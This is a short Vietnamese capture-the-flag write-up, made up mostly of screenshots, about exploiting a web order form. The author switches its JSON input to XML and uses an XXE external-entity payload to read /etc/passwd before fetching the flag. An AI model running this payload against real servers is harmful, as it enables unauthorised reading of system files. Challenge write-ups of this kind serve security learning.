![image](https://github.com/user-attachments/assets/2cd4fb7b-af4d-4644-9a27-163bb4c988c2)

Đây là giao diện của trang web, gồm có 1 ô để nhập vào:

![image](https://github.com/user-attachments/assets/72d6086c-4b80-4ad7-bee9-9de01cea47bf)

Đây là req của cái ô nhập đấy, sau khi nhập thì nó ở dạng json:

![image](https://github.com/user-attachments/assets/4881c9b2-bb06-4977-8740-8446dcfaed5b)

Mở src code ra đọc thì thấy cái mà user nhập vào được nó mang đi để mở file và nhận ở dạng json:

![image](https://github.com/user-attachments/assets/2dc927c7-5cc8-42f9-b0cd-bc64417d51b6)

Tôi thử /etc/passwd nhưng không có ra vì nó bị filter rồi:

![image](https://github.com/user-attachments/assets/efe900a9-f8cc-4453-b132-c388376e32cb)

Đọc tiếp bên dưới thì nó chấp nhận cả xml, có thể sẽ có xxe ở đây:

![image](https://github.com/user-attachments/assets/d2844aa3-70df-4ad9-bd40-13b1cbcf0dbb)

Tôi thử dùng 
```
<order> <table_num>4353</table_num> <food>Ice Scream</food> </order>
```
thì được

![image](https://github.com/user-attachments/assets/21236397-aaa6-4c72-a67f-ae8ba213fe12)

Đổi thành 

```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><order> <table_num>4353</table_num> <food>&test;</food> </order>
```
thì nó ra hẳn cái /etc/passwd, vậy thì giờ lấy flag thôi

![image](https://github.com/user-attachments/assets/c28ba968-5230-4d34-905d-67a9135d6afe)

![image](https://github.com/user-attachments/assets/0cc1f0e2-d799-49ff-9a80-4c1950467496)



